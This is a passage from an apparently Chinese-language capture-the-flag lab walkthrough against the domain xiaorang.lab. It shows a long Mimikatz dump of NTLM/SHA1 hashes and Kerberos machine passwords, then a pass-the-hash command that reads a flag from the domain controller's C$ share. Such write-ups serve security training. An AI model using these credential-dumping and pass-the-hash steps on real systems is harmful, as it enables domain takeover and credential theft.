51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 14014692 (00000000:00d5d8e4)\nSession           : Service from 0\nUser Name         : DefaultAppPool\nDomain            : IIS APPPOOL\nLogon Server      : (null)\nLogon Time        : 2023/11/7 14:04:19\nSID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 2e1664b283c4c7cca46e90addfe58af3\n         * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f\n        tspkg :\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN2016$\n         * Domain   : xiaorang.lab\n         * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 53809 (00000000:0000d231)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:27\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a\n         * SHA1     : e06238ecefc14d675f762b08a456770dc000f763\n        tspkg :\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN2016$\n         * Domain   : xiaorang.lab\n         * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e     f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3     bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61     23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40     fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea     e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a     a3 a6 05 64\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 53779 (00000000:0000d213)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:27\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 2e1664b283c4c7cca46e90addfe58af3\n         * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f\n        tspkg :\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN2016$\n         * Domain   : xiaorang.lab\n         * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : WIN2016$\nDomain            : XIAORANG\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:26\nSID               : S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 2e1664b283c4c7cca46e90addfe58af3\n         * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f\n        tspkg :\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : win2016$\n         * Domain   : XIAORANG.LAB\n         * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 24490999 (00000000:0175b3f7)\nSession           : RemoteInteractive from 2\nUser Name         : Aldrich\nDomain            : XIAORANG\nLogon Server      : DC01\nLogon Time        : 2023/11/7 16:07:26\nSID               : S-1-5-21-3289074908-3315245560-3429321632-1105\n        msv :\n         [00000003] Primary\n         * Username : Aldrich\n         * Domain   : XIAORANG\n         * NTLM     : f9cc30f8d5dea7c3e74b88fc0ebfcaa1\n         * SHA1     : 6e96b49b69ef7d301d8c20804845a6564c6558ad\n         * DPAPI    : 59359e5a87316c8d5d0759d96bbf6719\n        tspkg :\n        wdigest :\n         * Username : Aldrich\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : Aldrich\n         * Domain   : XIAORANG.LAB\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 24467096 (00000000:01755698)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2023/11/7 16:07:25\nSID               : S-1-5-90-0-2\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 2e1664b283c4c7cca46e90addfe58af3\n         * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f\n        tspkg :\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN2016$\n         * Domain   : xiaorang.lab\n         * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 995 (00000000:000003e3)\nSession           : Service from 0\nUser Name         : IUSR\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:30\nSID               : S-1-5-17\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:27\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 24451 (00000000:00005f83)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:26\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 2e1664b283c4c7cca46e90addfe58af3\n         * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : WIN2016$\nDomain            : XIAORANG\nLogon Server      : (null)\nLogon Time        : 2023/11/7 13:17:26\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : win2016$\n         * Domain   : XIAORANG.LAB\n         * Password : (null)\n        ssp :\n        credman :\n</code></pre> <p>\u62ff\u5230\u4e86WIN2016$\u7684ntlm\uff0c\u76f4\u63a5\u8bfb\u6700\u540e\u4e00\u4e2aflag <pre><code>privilege::debug\nsekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:2e1664b283c4c7cca46e90addfe58af3\n\n\n\nC:\\Windows\\system32&gt;type \\\\172.22.8.15\\c$\\Users\\Administrator\\flag\\flag03.txt\n _________               __    _                  _\n|  _   _  |             [  |  (_)                / |_\n|_/ | | \\_|.--.   .---.  | |  __  .---.  _ .--. `| |-'\n    | |   ( (`\\] / /'`\\] | | [  |/ /__\\\\[ `.-. | | |\n   _| |_   `'.'. | \\__.  | |  | || \\__., | | | | | |,\n  |_____| [\\__) )'.___.'[___][___]'.__.'[___||__]\\__/\n\n\nCongratulations! ! !\n\nflag03: flag{6929f1f6-dfdd-4ae0-a8f9-07c668c41ad7}\n</code></pre></p>"}]}